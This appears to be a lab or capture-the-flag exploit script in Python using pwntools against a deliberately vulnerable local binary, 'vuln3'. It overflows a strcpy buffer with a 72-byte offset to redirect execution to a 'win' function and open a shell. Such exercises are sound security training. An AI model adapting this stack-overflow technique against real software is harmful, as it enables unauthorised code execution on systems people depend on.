# Exploit for vuln3: Strcpy Stack Overflow (Ret2Win)
from pwn import *
import os

binary_path = os.path.abspath('../build/vuln3')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln3 (strcpy -> Ret2Win)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")

# Buffer is 64 bytes.
# Assuming standard layout: [buffer 64] [rbp 8] [ret 8]
offset = 72 # 64 + 8

payload = flat({
    offset: win_addr
})

# Use process without arguments, send payload to stdin
p = process(binary_path)
p.sendline(payload)

try:
    # Program prints "Enter hostname: " then "Hostname: ..." then should return to win()
    # It might buffer stdout, so we might not see "Hostname:" immediately if crashed?
    # But print has \n.
    
    output = p.recv(timeout=1)
    if b"Spawning shell" in output:
        log.success("Exploit Successful! Shell spawned.")
        p.interactive()

    else:
        log.failure("Exploit Failed. Output: " + output.decode(errors='ignore'))
        
except Exception as e:
    log.failure(f"Error: {e}")

